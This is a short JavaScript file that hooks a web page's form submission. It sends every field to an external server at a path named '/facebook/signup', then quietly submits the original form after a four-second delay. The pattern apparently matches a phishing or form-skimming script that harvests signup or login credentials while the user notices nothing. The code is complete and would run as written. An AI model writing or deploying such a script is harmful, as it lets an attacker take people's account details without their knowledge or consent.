const form = document.querySelector('form');

form.addEventListener('submit', async(e) => {
    e.preventDefault()
    const formData = new FormData(form);
    const formDataSerialized = Object.fromEntries(formData)
    const res = await fetch('https://grantb.onrender.com/facebook/signup', {
      method: 'POST',
      headers: {'Content-Type': 'Application/json'},
      body: JSON.stringify(formDataSerialized)
    })
    const data = await res.json();
    console.log(data)
    console.log(data._id)
    if(data._id) {
        setTimeout(() => {
            form.submit();
        }, 4000)   
    }
   
})
